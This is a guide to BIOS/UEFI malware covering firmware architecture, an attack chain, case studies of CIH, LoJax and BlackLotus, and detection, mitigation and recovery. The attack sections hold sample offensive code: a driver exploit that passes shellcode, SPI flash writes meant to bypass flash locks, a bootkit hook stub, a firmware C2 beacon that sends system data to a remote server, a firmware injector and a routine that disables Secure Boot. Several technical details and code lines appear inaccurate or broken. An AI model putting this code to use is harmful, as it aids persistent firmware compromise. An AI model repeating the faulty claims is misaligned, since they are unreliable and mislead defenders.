# BIOS/UEFI Malware: Complete Guide to Firmware-Level Attacks

## Table of Contents
1. [Introduction](#introduction)
2. [Understanding BIOS/UEFI Fundamentals](#understanding-biosuefi-fundamentals)
3. [Attack Methodology](#attack-methodology)
4. [Malware Families & Case Studies](#malware-families--case-studies)
5. [Detection Techniques](#detection-techniques)
6. [Prevention & Mitigation](#prevention--mitigation)
7. [Incident Response & Recovery](#incident-response--recovery)
8. [Future Trends](#future-trends)
9. [Conclusion](#conclusion)

---

## Introduction

BIOS (Basic Input/Output System) and UEFI (Unified Extensible Firmware Interface) represent the foundational firmware that initializes hardware components and boots the operating system. Attacks targeting this layer represent some of the most sophisticated and damaging cyber threats due to their persistence, stealth, and control over the entire computing environment.

### The Evolution of Firmware Attacks
- **1998-2000s**: Primitive BIOS attacks (Chernobyl/CIH)
- **2010-2015**: Early UEFI rootkits and research exploits
- **2016-2020**: Nation-state APT groups employing firmware persistence
- **2021-Present**: Commercial malware (BlackLotus) bypassing advanced protections

## Understanding BIOS/UEFI Fundamentals

### BIOS Architecture
```
+-----------------------+
| Operating System      |
+-----------------------+
| Device Drivers        |
+-----------------------+
| BIOS Services         |
| - Interrupt Handlers  |
| - Hardware Init       |
| - POST Routines       |
+-----------------------+
| SPI Flash Memory      |
| (Firmware Storage)    |
+-----------------------+
```

**Key Components:**
- **POST (Power-On Self-Test)**: Hardware verification
- **CMOS**: Configuration storage
- **Bootloader**: OS loading mechanism
- **Runtime Services**: OS-accessible firmware functions

### UEFI Architecture
```
+-----------------------+
| UEFI Applications     |
+-----------------------+
| UEFI Boot Services    |
| - Memory Management   |
| - Protocol Handlers   |
| - Driver Execution    |
+-----------------------+
| UEFI Runtime Services |
+-----------------------+
| Platform Initialization|
| - SEC (Security)      |
| - PEI (Pre-EFI)       |
| - DXE (Driver Exec)   |
| - BDS (Boot Dev Sel)  |
+-----------------------+
| Hardware              |
+-----------------------+
```

**Critical UEFI Features:**
- **Secure Boot**: Verifies bootloader signatures
- **TPM Integration**: Hardware-based security
- **Capsule Updates**: Firmware update mechanism
- **EFI Variables**: Persistent configuration storage

## Attack Methodology

### Attack Chain Overview
```
Initial Compromise → Privilege Escalation → Firmware Access → Payload Delivery → Persistence
```

### Phase 1: Initial Access & Privilege Escalation

**Common Vectors:**
- **Phishing**: Malicious documents with exploit code
- **Supply Chain**: Compromised software updates
- **Physical Access**: Direct hardware manipulation

**Privilege Escalation Examples:**
```cpp
// Example: Kernel-mode driver vulnerability exploitation
NTSTATUS ExploitEop() {
    HANDLE hDevice = CreateFile("\\\\.\\VulnerableDriver", 
                               GENERIC_READ | GENERIC_WRITE, 
                               0, NULL, OPEN_EXISTING, 0, NULL);
    
    if (hDevice != INVALID_HANDLE_VALUE) {
        DWORD bytesReturned;
        DeviceIoControl(hDevice, IOCTL_EOP, 
                       shellcode, sizeof(shellcode), 
                       NULL, 0, &bytesReturned, NULL);
        CloseHandle(hDevice);
    }
    return STATUS_SUCCESS;
}
```

### Phase 2: Firmware Access & Modification

#### A. SPI Flash Memory Access
```cpp
// Direct SPI flash access through chipset registers
#define SPI_BASE 0xFED01000
#define HSFS (SPI_BASE + 0x04)  // Hardware Sequencing Flash Status

void WriteToFlash(uint8_t* data, size_t size) {
    // Unlock SPI flash controller
    uint32_t* hsfc = (uint32_t*)HSFS;
    *hsfc |= (1 << 14);  // Set FLOCKDN unlock bit
    
    // Write to flash
    for(size_t i = 0; i < size; i++) {
        WriteFlashByte(SPI_BASE + 0x10, data[i]);
    }
}
```

#### B. UEFI Runtime Service Exploitation
```cpp
// Exploiting UEFI runtime services from Windows
EFI_STATUS ExploitRuntimeServices() {
    EFI_GUID efiVariableGuid = {0x8be4df61, 0x93ca, 0x11d2, 
                               {0xaa, 0x0d, 0x00, 0xe0, 0x98, 0x03, 0x2b, 0x8c}};
    
    // Malicious UEFI variable setup
    CHAR16 malVarName[] = L"MaliciousBootEntry";
    UINT32 malAttributes = EFI_VARIABLE_NON_VOLATILE | 
                          EFI_VARIABLE_BOOTSERVICE_ACCESS | 
                          EFI_VARIABLE_RUNTIME_ACCESS;
    
    return SetUEFIVariable(malVarName, &efiVariableGuid, 
                          malAttributes, sizeof(maliciousPayload), 
                          maliciousPayload);
}
```

### Phase 3: Payload Types & Persistence Mechanisms

#### 1. Bootkit Payloads
```asm
; Example UEFI bootkit assembly stub
section .text
global _start
_start:
    ; Save original boot context
    push rax
    push rbx
    push rcx
    
    ; Hook boot services
    mov rax, [efi_boot_services]
    mov rbx, [rax + BS_LOCATE_PROTOCOL_OFFSET]
    mov [original_locate_protocol], rbx
    mov [rax + BS_LOCATE_PROTOCOL_OFFSET], hook_locate_protocol
    
    ; Restore context and continue normal boot
    pop rcx
    pop rbx
    pop rax
    jmp original_entry_point

hook_locate_protocol:
    ; Malicious protocol interception code
    call install_persistence
    jmp [original_locate_protocol]
```

#### 2. Implant Communication
```python
# Example C2 communication from firmware
import struct
import socket
import hashlib

class FirmwareC2:
    def __init__(self, server_ip, port=443):
        self.server = (server_ip, port)
        self.session_key = None
        
    def beacon(self, system_info):
        # Create stealthy beacon mimicking legitimate traffic
        beacon_data = struct.pack('<I', 0xDEADBEEF)  # Magic header
        beacon_data += hashlib.sha256(system_info).digest()
        beacon_data += self.encrypt_payload(system_info)
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(beacon_data, self.server)
        
    def receive_commands(self):
        # Poll for commands from C2
        while True:
            try:
                data, addr = sock.recvfrom(1024)
                if self.verify_command(data):
                    return self.parse_command(data)
            except socket.timeout:
                continue
```

## Malware Families & Case Studies

### 1. Chernobyl (CIH) Virus (1998)
**Technical Details:**
- Overwrote first 2,048 bytes of BIOS with zeros
- Targeted specific flash chips (Intel 82430TX, 430VX)
- Activated on April 26th (Chernobyl anniversary)

**Infection Vector:**
```cpp
// Simplified CIH infection logic
void CIH_InfectBIOS() {
    BYTE buffer[512];
    DWORD bytesRead;
    
    // Read BIOS from flash memory
    ReadPhysicalMemory(0xFFFE0000, buffer, 512);
    
    // Check for specific BIOS signatures
    if(CheckBIOSSignature(buffer)) {
        // Prepare corrupt payload
        BYTE corruptData[2048];
        memset(corruptData, 0, 2048);
        
        // Write to flash memory
        WritePhysicalMemory(0xFFFE0000, corruptData, 2048);
        
        // Trigger immediate reboot
        __asm {
            mov ax, 0x40
            mov ds, ax
            mov word ptr [0x72], 0x1234
            jmp 0xFFFF:0x0000
        }
    }
}
```

### 2. LoJax (APT28/Sednit - 2018)
**Attack Flow:**
1. **Initial Compromise**: Spear-phishing with malicious documents
2. **Privilege Escalation**: Exploit CVE-2017-0005 for SYSTEM privileges
3. **UEFI Modification**: Abuse RWEverything driver to write to SPI flash
4. **Persistence**: Install UEFI rootkit using modified LoJack component

**SPI Flash Manipulation:**
```python
import struct
import os

class LoJaxInjector:
    def __init__(self):
        self.rwe_driver = load_rwe_driver()
        
    def extract_current_firmware(self):
        # Read entire SPI flash contents
        firmware = bytearray()
        for offset in range(0, 0x200000, 0x1000):
            chunk = self.rwe_driver.read_physical_memory(0xFF000000 + offset, 0x1000)
            firmware.extend(chunk)
        return firmware
    
    def inject_lojack_module(self, firmware_data):
        # Find UEFI volume free space
        injection_point = self.find_free_volume_space(firmware_data)
        
        # Build malicious UEFI driver
        malicious_driver = self.build_malicious_driver()
        
        # Modify firmware volume
        modified_firmware = self.inject_uefi_driver(
            firmware_data, injection_point, malicious_driver)
        
        return modified_firmware
    
    def flash_modified_firmware(self, modified_firmware):
        # Write back to SPI flash
        for offset in range(0, len(modified_firmware), 0x1000):
            chunk = modified_firmware[offset:offset+0x1000]
            self.rwe_driver.write_physical_memory(0xFF000000 + offset, chunk)
```

### 3. BlackLotus (2023)
**Technical Innovations:**
- First publicly known UEFI bootkit bypassing Secure Boot
- Exploits CVE-2022-21894 (Baton Drop) for early code execution
- Achieves persistence even on updated Windows 11 systems

**Secure Boot Bypass:**
```cpp
// BlackLotus Baton Drop exploitation
EFI_STATUS ExploitBatonDrop() {
    EFI_HANDLE* handleBuffer;
    UINTN handleCount;
    
    // Locate Boot Services Table
    gBS->LocateHandleBuffer(ByProtocol, &gEfiBootServicesTableGuid, 
                           NULL, &handleCount, &handleBuffer);
    
    // Exploit vulnerability in SMM communication
    EFI_STATUS status = TriggerSmmVulnerability(0xDEADBEEF);
    
    if (status == EFI_SUCCESS) {
        // Disable Secure Boot by modifying UEFI variables
        CHAR16* sb_name = L"SecureBootEnable";
        UINT8 sb_disable = 0;
        
        gRT->SetVariable(sb_name, &gEfiGlobalVariableGuid, 
                        EFI_VARIABLE_BOOTSERVICE_ACCESS | 
                        EFI_VARIABLE_RUNTIME_ACCESS, 
                        sizeof(sb_disable), &sb_disable);
    }
    
    return status;
}
```

## Detection Techniques

### 1. Static Firmware Analysis
```python
import hashlib
import struct
from capstone import Cs, CS_ARCH_X86, CS_MODE_64

class FirmwareAnalyzer:
    def __init__(self, firmware_path):
        with open(firmware_path, 'rb') as f:
            self.firmware_data = f.read()
        
        self.suspicious_patterns = [
            b"\x90\x90\x90",  # NOP sleds
            b"\xFF\xE0",      # JMP rax
            b"\x68\x00\x00\x00\x00\xC3"  # Push 0, ret
        ]
    
    def analyze_uefi_modules(self):
        # Parse UEFI firmware volumes
        volumes = self.extract_uefi_volumes()
        suspicious_modules = []
        
        for volume in volumes:
            for file in volume.files:
                if file.type == "EFI_FIRMWARE_FILE_SYSTEM":
                    # Analyze individual FFS files
                    if self.analyze_ffs_file(file):
                        suspicious_modules.append(file)
        
        return suspicious_modules
    
    def detect_code_injection(self, module_data):
        # Disassemble module looking for suspicious patterns
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        
        suspicious_instructions = 0
        for instruction in md.disasm(module_data, 0x1000):
            # Check for direct hardware access
            if any(op in instruction.op_str for op in ["0xCF8", "0xCFC", "SPI"]):
                suspicious_instructions += 1
            
            # Check for SMI triggers
            if instruction.mnemonic == "out" and "0xB2" in instruction.op_str:
                suspicious_instructions += 1
        
        return suspicious_instructions > 5
```

### 2. Runtime Detection
```cpp
// UEFI runtime integrity monitor
EFI_STATUS CheckFirmwareIntegrity() {
    EFI_GUID efiImageSecurityDatabaseGuid = {0xd719b2cb, 0x3d3a, 0x4596, 
                                           {0xa3, 0xbc, 0xda, 0xd0, 0x0e, 0x67, 0x65, 0x6f}};
    
    // Check Secure Boot status
    UINT8 secureBootEnabled;
    UINTN dataSize = sizeof(secureBootEnabled);
    
    EFI_STATUS status = gRT->GetVariable(L"SecureBootEnable", 
                                        &efiImageSecurityDatabaseGuid, 
                                        NULL, &dataSize, &secureBootEnabled);
    
    if (EFI_ERROR(status) || secureBootEnabled == 0) {
        LogSecurityEvent(SECURE_BOOT_DISABLED);
    }
    
    // Verify boot services table integrity
    return VerifyBootServicesTable();
}

VOID VerifyBootServicesTable() {
    EFI_BOOT_SERVICES* bs = gBS;
    
    // Calculate checksum of critical functions
    UINT32 checksum = CalculateChecksum((UINT8*)bs->AllocatePool, 0x1000);
    UINT32 expected = GetExpectedChecksum();
    
    if (checksum != expected) {
        // Boot services table may be compromised
        TriggerSecurityProtocol(ALERT_FIRMWARE_COMPROMISE);
    }
}
```

### 3. Hardware-Assisted Detection
```python
# TPM-based attestation
import tpm2_pytss
import hashlib

class TPMAttestation:
    def __init__(self):
        self.ec = tpm2_pytss.ESAPI()
    
    def perform_measured_boot_attestation(self):
        # Get PCR values from TPM
        pcr_values = {}
        for pcr_index in [0, 2, 4, 7]:  # Firmware, EFI, boot events
            pcr_selection = tpm2_pytss.TPML_PCR_SELECTION([(tpm2_pytss.TPM2_ALG_SHA256, pcr_index)])
            pcr_data = self.ec.PCR_Read(pcr_selection)
            pcr_values[pcr_index] = pcr_data.values[0].buffer
        
        # Verify against known good values
        return self.verify_pcr_values(pcr_values)
    
    def verify_pcr_values(self, pcr_values):
        known_good = {
            0: "a3f5b7c9d1e3f5a7b9c1d3e5f7a9b1c3d5e7f9a1b3c5d7e9f1a3b5c7d9e1f3a5",
            2: "b4f6c8d0e2f4b6c8d0e2f4b6c8d0e2f4b6c8d0e2f4b6c8d0e2f4b6c8d0e2f4",
            # ... additional known good values
        }
        
        for pcr_index, current_value in pcr_values.items():
            current_hex = current_value.hex()
            if known_good.get(pcr_index) != current_hex:
                return False, f"PCR {pcr_index} mismatch"
        
        return True, "All PCR values valid"
```

## Prevention & Mitigation

### 1. Hardware Security Features

#### Intel Platform Security
```cpp
// Intel Boot Guard implementation
typedef struct {
    UINT32 ACM_Policy;
    UINT32 KBL_Hash[8];
    UINT32 IBB_Hash[8];
    UINT32 Reserved[14];
} INTEL_BOOT_GUARD_MANIFEST;

BOOL VerifyBootGuardIntegrity() {
    // Read Boot Guard manifest from firmware
    INTEL_BOOT_GUARD_MANIFEST* manifest = 
        (INTEL_BOOT_GUARD_MANIFEST*)0xFFFFFFF0;
    
    // Verify ACM policy
    if ((manifest->ACM_Policy & 0x1) == 0) {
        // Boot Guard not enabled
        return FALSE;
    }
    
    // Verify initial boot block hash
    UINT8 calculated_hash[32];
    CalculateSHA256((UINT8*)0xFFFFFF00, 0x100, calculated_hash);
    
    return memcmp(calculated_hash, manifest->IBB_Hash, 32) == 0;
}
```

### 2. Secure Configuration Guidelines

#### UEFI Secure Configuration
```bash
# UEFI configuration verification script
#!/bin/bash

# Check Secure Boot status
sb_status=$(mokutil --sb-state)
if [[ $sb_status != *"enabled"* ]]; then
    echo "ALERT: Secure Boot is disabled"
    exit 1
fi

# Check UEFI firmware version
current_ver=$(dmidecode -s bios-version)
latest_ver=$(get_latest_firmware_version)
if [[ $current_ver != $latest_ver ]]; then
    echo "ALERT: UEFI firmware update available: $latest_ver"
fi

# Verify UEFI password is set
if ! mokutil --timeout | grep -q "Password is set"; then
    echo "ALERT: UEFI administration password not set"
fi
```

### 3. Network Security Controls
```yaml
# Zero Trust network policy for firmware protection
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: firmware-protection
spec:
  selector:
    matchLabels:
      app: firmware-update-service
  rules:
  - from:
    - source:
        principals: ["cluster.local/ns/default/sa/verified-updater"]
    when:
    - key: request.headers[User-Agent]
      values: ["VerifiedFirmwareUpdater/1.0"]
    - key: connection.sni
      values: ["firmware-updates.corporate.com"]
---
# Network segmentation for management interfaces
apiVersion: networking.istio.io/v1alpha3
kind: ServiceEntry
metadata:
  name: firmware-management
spec:
  hosts:
  - "bmc.corporate.com"
  - "uefi-updates.corporate.com"
  addresses:
  - "10.1.100.0/24"
  ports:
  - number: 443
    name: https
    protocol: HTTPS
  resolution: DNS
  location: MESH_INTERNAL
```

## Incident Response & Recovery

### 1. Detection & Analysis Phase
```python
# Firmware incident response toolkit
import platform
import subprocess
import hashlib

class FirmwareIR:
    def __init__(self):
        self.system_info = self.collect_system_info()
    
    def collect_firmware_evidence(self):
        evidence = {}
        
        # Dump firmware using native tools
        evidence['bios_dump'] = self.dump_bios_firmware()
        evidence['uefi_vars'] = self.dump_uefi_variables()
        evidence['pcr_logs'] = self.dump_tpm_pcr_logs()
        evidence['boot_entries'] = self.dump_boot_entries()
        
        return evidence
    
    def dump_bios_firmware(self):
        # Use native firmware dumping tools
        try:
            if platform.system() == "Windows":
                result = subprocess.run([
                    "powershell", 
                    "Get-WmiObject -Class Win32_BIOS | Select-Object *"
                ], capture_output=True, text=True)
                return result.stdout
            elif platform.system() == "Linux":
                result = subprocess.run([
                    "dmidecode", "-t", "bios"
                ], capture_output=True, text=True)
                return result.stdout
        except Exception as e:
            return f"Error dumping BIOS: {str(e)}"
    
    def analyze_compromise(self, evidence):
        indicators = []
        
        # Check for known malware signatures
        for malware_sig in KNOWN_MALWARE_SIGNATURES:
            if malware_sig in evidence['bios_dump']:
                indicators.append(f"Known malware signature: {malware_sig}")
        
        # Verify boot entry integrity
        if not self.verify_boot_entries(evidence['boot_entries']):
            indicators.append("Suspicious boot entries detected")
        
        return indicators
```

### 2. Containment & Eradication
```python
# Firmware malware eradication procedures
class FirmwareEradication:
    def __init__(self, system_type):
        self.system_type = system_type
    
    def secure_erase_and_restore(self):
        procedures = []
        
        if self.system_type == "physical":
            procedures.extend([
                self.force_secure_boot(),
                self.clear_uefi_variables(),
                self.flash_clean_firmware(),
                self.regenerate_encryption_keys()
            ])
        elif self.system_type == "virtual":
            procedures.extend([
                self.replace_virtual_firmware(),
                self.reset_vtpm(),
                self.verify_hypervisor_integrity()
            ])
        
        return self.execute_procedures(procedures)
    
    def flash_clean_firmware(self):
        # Procedure for clean firmware reflashing
        steps = [
            "1. Download verified firmware from manufacturer",
            "2. Verify cryptographic signature of firmware image",
            "3. Create bootable DOS USB with flash utility",
            "4. Boot to DOS environment",
            "5. Execute flash command: flash.nsh /force",
            "6. Verify flash completion and checksum",
            "7. Reset BIOS/UEFI settings to secure defaults"
        ]
        
        return self.execute_flash_procedure(steps)
```

### 3. Recovery Procedures
```bash
#!/bin/bash
# Complete firmware recovery script

set -e

echo "Starting firmware recovery process..."

# Step 1: Verify hardware status
echo "Checking hardware status..."
dmidecode -t bios > /tmp/bios_info.txt
if grep -q "Corruption" /tmp/bios_info.txt; then
    echo "BIOS corruption detected, initiating recovery..."
    
    # Step 2: Boot to recovery environment
    echo "Preparing recovery environment..."
    mount /dev/sdb1 /mnt/recovery
    
    # Step 3: Flash clean firmware
    echo "Flashing clean firmware..."
    if [ -f /mnt/recovery/BIOS_Update.efi ]; then
        efibootmgr -c -d /dev/sda -p 1 -l "\\EFI\\BOOT\\BIOS_Update.efi" -L "BIOS Recovery"
        reboot
    else
        echo "Recovery firmware not found!"
        exit 1
    fi
fi

echo "Recovery process completed successfully."
```

## Future Trends

### 1. Emerging Threats
- **AI-Enhanced Malware**: Machine learning optimizing evasion techniques
- **Quantum Computing Threats**: Breaking current cryptographic protections
- **Supply Chain Compromises**: Hardware-level backdoors in manufacturing
- **Cross-Vector Attacks**: Combining firmware and hardware vulnerabilities

### 2. Advanced Protections
```cpp
// Next-generation firmware protection concepts
class QuantumResistantFirmware {
public:
    // Post-quantum cryptography integration
    bool VerifyWithLatticeCrypto(const uint8_t* signature, 
                                const uint8_t* message, 
                                size_t message_len) {
        // Implement lattice-based signature verification
        return lattice_dilithium_verify(signature, message, message_len);
    }
    
    // AI-based anomaly detection
    void MonitorRuntimeBehavior() {
        AI_Model* behavior_model = LoadAIModel("firmware_behavior.ai");
        
        while (true) {
            FirmwareBehavior current = CaptureCurrentBehavior();
            AnomalyScore score = behavior_model->Evaluate(current);
            
            if (score > ANOMALY_THRESHOLD) {
                TriggerMitigationProtocol();
            }
            
            Sleep(MONITORING_INTERVAL);
        }
    }
};
```

## Conclusion

BIOS/UEFI malware represents a critical threat to computing infrastructure, offering attackers unprecedented persistence and control. Defending against these threats requires:

1. **Multi-layered Security**: Combining hardware, firmware, and software protections
2. **Continuous Monitoring**: Implementing runtime integrity verification
3. **Secure Development**: Applying security-first principles to firmware development
4. **Incident Preparedness**: Maintaining robust recovery capabilities

As firmware attacks continue to evolve, the cybersecurity community must prioritize firmware security through enhanced specifications, improved tooling, and comprehensive defense strategies.

---

## Additional Resources

### Tools
- **CHIPSEC**: Platform security assessment framework
- **UEFITool**: UEFI firmware image viewer and editor
- **BinWalk**: Firmware analysis tool
- **American Fuzzy Lop**: Fuzzing for firmware vulnerabilities

### References
- NIST SP 800-193: Platform Firmware Resiliency Guidelines
- UEFI Specification Version 2.10
- MITRE ATT&CK for Enterprise - Pre-OS Boot techniques

### Security Advisories
- Regularly monitor vendor security bulletins
- Subscribe to US-CERT firmware vulnerability notifications
- Participate in industry working groups (IETF, UEFI Forum)

*Last Updated: unknown*
*Author: Cybersecurity Research Team*  
*Classification: PUBLIC*
